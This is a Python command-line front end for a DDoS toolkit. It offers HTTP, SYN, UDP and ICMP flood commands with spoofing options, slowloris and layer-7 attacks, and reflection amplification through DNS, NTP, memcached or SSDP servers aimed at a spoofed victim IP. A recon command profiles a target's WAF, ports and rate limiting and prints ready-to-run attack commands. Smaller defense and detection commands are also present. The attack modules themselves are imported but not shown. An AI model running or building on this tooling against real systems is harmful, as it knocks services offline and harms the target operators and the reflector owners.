import asyncio
import sys
from typing import Optional

import click

from core.config import get_config
from core.engine import registry, session_manager
from core.logger import setup_logger, LogLevel
from utils.reporter import reporter


@click.group(invoke_without_command=True)
@click.option("--tui/--no-tui", default=True, help="Launch Text User Interface (default)")
@click.option("--log-level", default="INFO", help="Log level")
@click.pass_context
def cli(ctx: click.Context, tui: bool, log_level: str) -> None:
    setup_logger(level=LogLevel(log_level.upper()))
    registry.auto_discover()

    if ctx.invoked_subcommand is None and tui:
        from ui.app import run_tui
        run_tui()
        return


@cli.group()
def attack() -> None:
    pass


@attack.command("http-flood")
@click.option("--target", "-t", required=True, help="Target URL or IP")
@click.option("--port", "-p", default=443, type=int)
@click.option("--rate", "-r", default=1000, type=int, help="Requests per second")
@click.option("--concurrent", "-c", default=100, type=int, help="Concurrent connections")
@click.option("--method", "-m", default="GET", type=click.Choice(["GET", "POST", "HEAD"]))
@click.option("--duration", "-d", default=0, type=int, help="Duration in seconds (0=unlimited)")
def http_flood_cmd(target: str, port: int, rate: int, concurrent: int, method: str, duration: int) -> None:
    from attack.http_flood import HTTPFloodAttack
    _run_attack(HTTPFloodAttack, target, port=port, rate=rate, concurrent=concurrent, method=method, duration=duration)


@attack.command("syn-flood")
@click.option("--target", "-t", required=True)
@click.option("--port", "-p", default=443, type=int)
@click.option("--rate", "-r", default=1000, type=int)
@click.option("--spoof/--no-spoof", default=False)
@click.option("--threads", "-n", default=10, type=int)
def syn_flood_cmd(target: str, port: int, rate: int, spoof: bool, threads: int) -> None:
    from attack.syn_flood import SYNFloodAttack
    _run_attack(SYNFloodAttack, target, port=port, rate=rate, spoof=spoof, threads=threads)


@attack.command("udp-flood")
@click.option("--target", "-t", required=True)
@click.option("--port", "-p", default=53, type=int)
@click.option("--rate", "-r", default=1000, type=int)
@click.option("--packet-size", "-s", default=512, type=int)
@click.option("--spoof/--no-spoof", default=False)
def udp_flood_cmd(target: str, port: int, rate: int, packet_size: int, spoof: bool) -> None:
    from attack.udp_flood import UDPFloodAttack
    _run_attack(UDPFloodAttack, target, port=port, rate=rate, packet_size=packet_size, spoof=spoof)


@attack.command("slowloris")
@click.option("--target", "-t", required=True)
@click.option("--port", "-p", default=80, type=int)
@click.option("--connections", "-c", default=200, type=int)
@click.option("--timeout", default=120, type=int)
def slowloris_cmd(target: str, port: int, connections: int, timeout: int) -> None:
    from attack.slowloris import SlowlorisAttack
    _run_attack(SlowlorisAttack, target, port=port, connections=connections, timeout=timeout)


@attack.command("layer7")
@click.option("--target", "-t", required=True)
@click.option("--concurrent", "-c", default=100, type=int)
@click.option("--rate", "-r", default=50, type=int)
def layer7_cmd(target: str, concurrent: int, rate: int) -> None:
    from attack.layer7 import Layer7Attack
    _run_attack(Layer7Attack, target, concurrent=concurrent, rate=rate)


@attack.command("icmp-flood")
@click.option("--target", "-t", required=True)
@click.option("--rate", "-r", default=1000, type=int)
@click.option("--packet-size", "-s", default=64, type=int)
def icmp_flood_cmd(target: str, rate: int, packet_size: int) -> None:
    from attack.icmp_flood import ICMPFloodAttack
    _run_attack(ICMPFloodAttack, target, rate=rate, packet_size=packet_size)


@attack.command("amplification")
@click.option("--target", "-t", required=True, help="Victim IP (spoofed source)")
@click.option("--reflector", "-r", required=True, help="Reflector server IP")
@click.option("--service", "-s", default="dns", type=click.Choice(["dns", "ntp", "memcached", "ssdp"]))
@click.option("--rate", default=100, type=int)
def amp_cmd(target: str, reflector: str, service: str, rate: int) -> None:
    from attack.amplification import AmplificationAttack
    svc_ports = {"dns": 53, "ntp": 123, "memcached": 11211, "ssdp": 1900}
    _run_attack(AmplificationAttack, target, reflector_ip=reflector, reflector_port=svc_ports.get(service, 53), service=service, rate=rate, spoof_src=target)


@cli.group()
def defend() -> None:
    pass


@defend.command("proxy")
@click.option("--listen", "-l", default="0.0.0.0:8080")
@click.option("--backend", "-b", default="http://localhost:3000")
@click.option("--rate-limit", "-r", default=100, type=int)
def proxy_cmd(listen: str, backend: str, rate_limit: int) -> None:
    from defense.reverse_proxy import ReverseProxy
    _run_defense(ReverseProxy, "reverse_proxy", listen=listen, backend=backend, rate_limit=rate_limit)


@defend.command("rate-limit")
@click.option("--max-rate", "-r", default=100, type=int)
@click.option("--window", "-w", default=60, type=int)
def rate_limit_cmd(max_rate: int, window: int) -> None:
    from defense.rate_limiter import RateLimiter
    _run_defense(RateLimiter, "rate_limiter", max_rate=max_rate, window_secs=window)


@defend.command("data-guard")
@click.option("--max-body", default=10485760, type=int)
@click.option("--entropy", default=5.5, type=float)
def dataguard_cmd(max_body: int, entropy: float) -> None:
    from defense.data_guard import DataGuard
    _run_defense(DataGuard, "data_guard", max_body_size=max_body, entropy_threshold=entropy)


@cli.group()
def detect() -> None:
    pass


@detect.command("monitor")
@click.option("--interface", "-i", default="eth0")
@click.option("--threshold", "-t", default=5000, type=int)
def monitor_cmd(interface: str, threshold: int) -> None:
    from detection.monitor import TrafficMonitor
    _run_detection(TrafficMonitor, "monitor", interface=interface, alert_threshold=threshold)


@detect.command("anomaly")
@click.option("--baseline", "-b", default=60, type=int, help="Baseline collection duration (seconds)")
@click.option("--sensitivity", "-s", default=1.5, type=float)
def anomaly_cmd(baseline: int, sensitivity: float) -> None:
    from detection.anomaly import AnomalyDetector
    _run_detection(AnomalyDetector, "anomaly", baseline_duration=baseline, sensitivity=sensitivity)


@detect.command("entropy")
@click.option("--ddos-threshold", default=0.3, type=float)
@click.option("--exfil-threshold", default=7.0, type=float)
def entropy_cmd(ddos_threshold: float, exfil_threshold: float) -> None:
    from detection.entropy import EntropyAnalyzer
    _run_detection(EntropyAnalyzer, "entropy", ddos_threshold=ddos_threshold, exfil_threshold=exfil_threshold)


@cli.command("report")
@click.option("--session-id", "-s", help="Session ID to report")
@click.option("--format", "-f", "fmt", default="terminal", type=click.Choice(["terminal", "json", "html"]))
def report_cmd(session_id: Optional[str], fmt: str) -> None:
    if session_id:
        session = session_manager.get_session(session_id)
        if not session:
            click.echo(f"Session {session_id} not found")
            return
        data = session.to_dict()
    else:
        sessions = session_manager.list_sessions()
        if not sessions:
            click.echo("No sessions found")
            return
        data = {"sessions": sessions, "count": len(sessions)}

    if fmt == "terminal":
        reporter.print_result(data, title="Session Report")
    elif fmt == "json":
        path = reporter.export_json(data)
        click.echo(f"Exported to {path}")
    elif fmt == "html":
        path = reporter.export_html(data)
        click.echo(f"Exported to {path}")


@cli.command("config")
@click.option("--get", "key", help="Get config value (e.g. attack.default_rate)")
@click.option("--set", "set_pair", help="Set config value (format: key=value)")
def config_cmd(key: Optional[str], set_pair: Optional[str]) -> None:
    config = get_config()
    if set_pair:
        try:
            k, v = set_pair.split("=", 1)
            config.set(k.strip(), _parse_value(v.strip()))
            config.save()
            click.echo(f"Set {k} = {v}")
        except Exception as e:
            click.echo(f"Error: {e}", err=True)
    elif key:
        val = config.get(key)
        click.echo(f"{key} = {val}")
    else:
        import yaml
        click.echo(yaml.dump(config.model_dump(), default_flow_style=False))


@cli.command("interfaces")
def interfaces_cmd() -> None:
    from utils.network import get_interfaces
    for iface in get_interfaces():
        status = "UP" if iface.is_up else "DOWN"
        click.echo(f"{iface.name:15s} {iface.ip:15s} {iface.mac:20s} [{status}]")


@cli.command("recon")
@click.option("--target", "-t", required=True, help="Target URL or host")
@click.option("--no-ports", is_flag=True, help="Skip port scanning")
def recon_cmd(target: str, no_ports: bool) -> None:
    from utils.validators import validate_target
    valid, host, error = validate_target(target)
    if not valid:
        click.echo(f"\n  [error] {error}\n")
        return

    from utils.target_profiler import scan_target
    profile = asyncio.run(scan_target(target, scan_ports=not no_ports))

    click.echo(f"\n  Target Profile: {profile.url}")
    click.echo(f"  {'═' * 40}")
    click.echo(f"  Host:    {profile.host}")
    click.echo(f"  IP:      {profile.ip or '?'}")
    click.echo(f"  Port:    {profile.port} {'(HTTPS)' if profile.is_https else '(HTTP)'}")
    click.echo(f"  Status:  {profile.status_code or 'unreachable'}")
    click.echo(f"  Time:    {profile.response_time*1000:.0f}ms")
    click.echo(f"  Server:  {profile.server or '?'}")

    if profile.tech_stack:
        click.echo(f"  Tech:    {', '.join(profile.tech_stack)}")
    if profile.waf:
        click.echo(f"  WAF:     {', '.join(profile.waf)}")
    else:
        click.echo(f"  WAF:     None")
    if profile.tls_version:
        click.echo(f"  TLS:     {profile.tls_version}")
    if profile.open_ports:
        click.echo(f"  Ports:   {', '.join(str(p) for p in profile.open_ports)}")
    if profile.rate_limited:
        click.echo(f"  Rate-limited: YES")

    if profile.suggested_attacks:
        click.echo(f"\n  Suggested Attacks:")
        for s in profile.suggested_attacks:
            icon = click.style("HIGH", fg="green") if s["priority"] == "high" else click.style("MED", fg="yellow")
            click.echo(f"    [{icon}] {s['attack']} — {s['reason']}")
            if "config" in s:
                cfg = " ".join(f"--{k} {v}" for k, v in s["config"].items() if k not in ("spoof",))
                click.echo(f"         ddos.py attack {s['attack']} -t {profile.host} {cfg}")

    if profile.errors:
        click.echo(f"\n  Notes: {'; '.join(profile.errors[:5])}")
    click.echo()


def _parse_value(v: str):
    if v.lower() in ("true", "yes"):
        return True
    if v.lower() in ("false", "no"):
        return False
    try:
        return int(v)
    except ValueError:
        pass
    try:
        return float(v)
    except ValueError:
        pass
    return v


def _run_attack(cls, target: str, **kwargs):
    duration = kwargs.pop("duration", 0)
    session = session_manager.create_session(module=cls.name, target=target, mode="attack")
    module = cls(session=session, event_bus=None)

    async def _timed_start():
        start_task = asyncio.create_task(module.start(target=target, **kwargs))
        if duration > 0:
            await asyncio.sleep(duration)
            session.stop()
        await start_task

    try:
        asyncio.run(_timed_start())
    except KeyboardInterrupt:
        click.echo("\nAttack stopped.")
    reporter.print_result(session.to_dict(), title="Attack Report")


def _run_defense(cls, name: str, **kwargs):
    session = session_manager.create_session(module=name, target="localhost", mode="defense")
    module = cls(session=session, event_bus=None)
    try:
        asyncio.run(module.start(**kwargs))
    except KeyboardInterrupt:
        click.echo("\nDefense stopped.")
    reporter.print_defense_status(session.to_dict())


def _run_detection(cls, name: str, **kwargs):
    session = session_manager.create_session(module=name, target="monitor", mode="detection")
    module = cls(session=session, event_bus=None)
    try:
        asyncio.run(module.start(**kwargs))
    except KeyboardInterrupt:
        click.echo("\nDetection stopped.")
    reporter.print_result(session.to_dict(), title="Detection Report")


if __name__ == "__main__":
    cli()
